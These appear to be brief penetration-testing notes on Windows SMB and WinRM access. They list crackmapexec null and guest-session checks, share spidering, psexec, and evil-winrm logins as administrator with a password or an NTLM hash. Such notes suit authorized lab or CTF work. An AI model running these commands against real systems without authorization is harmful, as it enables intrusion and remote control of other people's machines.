

Add domain NB name to /etc/hosts

```shell
crackmapexec smb $TARGET_IP -u '' -p ''
```

Show all files and DIRs for guest:

```shell
crackmapexec smb $TARGET_IP -u 'guest' -p '' -M spider_plus
```

Parse the JSON from the previous cmd into readable form:

```shell
cat $TARGET_IP.json | jq '. |map_values(keys)'
```

Try to connect to console:

```shell
impacket-psexec $USER@$TARGET_IP
```

```shell
evil-winrm -i $TARGET_IP -u administrator -p $PASSWORD
```

```shell
evil-winrm -i $TARGET_IP -u administrator -H $HASH
```

```sh
crackmapexec winrm $TARGET_IP -u $USER -p $PASSWORD
```